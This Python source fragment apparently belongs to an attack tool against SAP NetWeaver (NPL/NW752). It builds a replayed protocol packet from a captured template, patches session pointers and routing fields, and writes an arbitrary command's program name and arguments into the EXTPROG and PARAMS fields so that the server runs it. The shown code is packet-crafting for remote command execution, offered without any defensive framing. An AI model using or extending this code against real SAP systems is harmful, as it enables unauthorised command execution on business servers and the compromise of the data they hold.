# NPL/NW752 fixed-size field offsets within P3_NPL_TEMPLATE (NI payload positions)
_NPL_EXTPROG_OFF     = 0x0603  # 256 bytes: CHAR(128) UTF-16 LE, zero-padded
_NPL_LONG_PARAMS_OFF = 0x0725  # 2048 bytes: CHAR(1024) UTF-16 LE, space-padded (unused)
_NPL_PARAMS_OFF      = 0x0f3d  # 510 bytes: CHAR(255) UTF-16 LE, space-padded


def _build_p3_npl(conv_id, cmd_str, pte, sid='NPL', appserver='npl-sxpg', client_ip=None, target_ip=None):
    """Build P3 for NPL/NW752 using fixed-size EXTPROG and PARAMS fields.

    NPL uses two separate fields for program and arguments:
    - EXTPROG  [0x603:0x703] (256 bytes): program name in CHAR(128) UTF-16 LE
    - PARAMS   [0xf3d:0x113b] (510 bytes): arguments  in CHAR(255) UTF-16 LE

    Both fields are fixed-size (zero/space padded), so packet length never
    changes and no CPIC counter patching is needed for command variations.

    pte       -- 16-byte session pointer from P2 response.
    sid       -- SAP System ID (3 chars, default 'NPL').
    appserver -- Application server hostname for TH routing (default 'npl-sxpg').
    """
    # Split command into program and arguments
    parts = cmd_str.split(' ', 1)
    program = parts[0]
    args = parts[1] if len(parts) > 1 else ''

    pkt = bytearray(P3_NPL_TEMPLATE)

    # Conv_id at offset 40-47
    pkt[40:48] = conv_id.encode()[:8].ljust(8, b'\x00')

    # Patch session PTEs
    pkt = bytearray(bytes(pkt).replace(_NPL_MAIN_PTE, pte))
    pkt = bytearray(bytes(pkt).replace(_NPL_TH_PTE, _compute_th_pte(pte)))
    # Patch variant PTEs (cc/d1 subtypes at end of template share same IP tail)
    pkt = bytearray(bytes(pkt).replace(_NPL_PTE_IP_SUFFIX_OLD,
                                       bytes.fromhex('e1000000') + pte[12:16]))

    # Patch TH routing, connection-info SID, and CPIC UTF-16 parameter block FIRST.
    # The routing patch replaces variable-length UTF-16 fields that occur before
    # _NPL_EXTPROG_OFF, which can shrink the packet and shift subsequent offsets.
    # We must apply the patch before writing EXTPROG/PARAMS so we can adjust their
    # offsets by the resulting size delta.
    len_before = len(pkt)
    pkt = _patch_p3_routing_npl(pkt, sid, appserver)
    pkt = _patch_conn_info_npl(pkt, client_ip, target_ip)
    offset_delta = len(pkt) - len_before

    extprog_off = _NPL_EXTPROG_OFF + offset_delta
    params_off  = _NPL_PARAMS_OFF  + offset_delta

    # Write EXTPROG: program name as CHAR(128) UTF-16 LE, zero-padded to 256 bytes
    prog_u16 = program.encode('utf-16-le')
    extprog = (prog_u16 + b'\x00' * max(0, 256 - len(prog_u16)))[:256]
    pkt[extprog_off:extprog_off + 256] = extprog

    # Write PARAMS: arguments as CHAR(255) UTF-16 LE, space-padded to 510 bytes
    # Each UTF-16 space = b'\x20\x00' (2 bytes); pad with full char-pairs then zero-fill
    args_u16 = args.encode('utf-16-le')
    n_space_pad = max(0, (510 - len(args_u16)) // 2)
    params = (args_u16 + b'\x20\x00' * n_space_pad)[:510].ljust(510, b'\x00')
    pkt[params_off:params_off + 510] = params

    return bytes(pkt)


